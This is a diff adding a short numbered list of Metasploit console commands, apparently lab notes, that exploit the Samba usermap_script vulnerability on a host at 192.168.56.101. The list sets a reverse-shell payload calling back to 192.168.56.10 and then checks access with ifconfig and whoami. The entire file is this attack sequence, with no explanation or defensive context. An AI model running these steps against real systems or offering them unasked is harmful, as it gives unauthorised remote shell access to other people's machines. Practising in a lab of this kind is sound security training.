@@ -1,0 +1,20 @@
+1. search samba
+
+2. use exploit/multi/samba/usermap_script
+
+3. options
+
+4. set rhosts 192.168.56.101
+
+5. set payload cmd/unix/reverse
+
+6. set lhost 192.168.56.10
+
+7. exploit
+
+8. ifconfig
+
+9. whoami
+
+10. exit
+
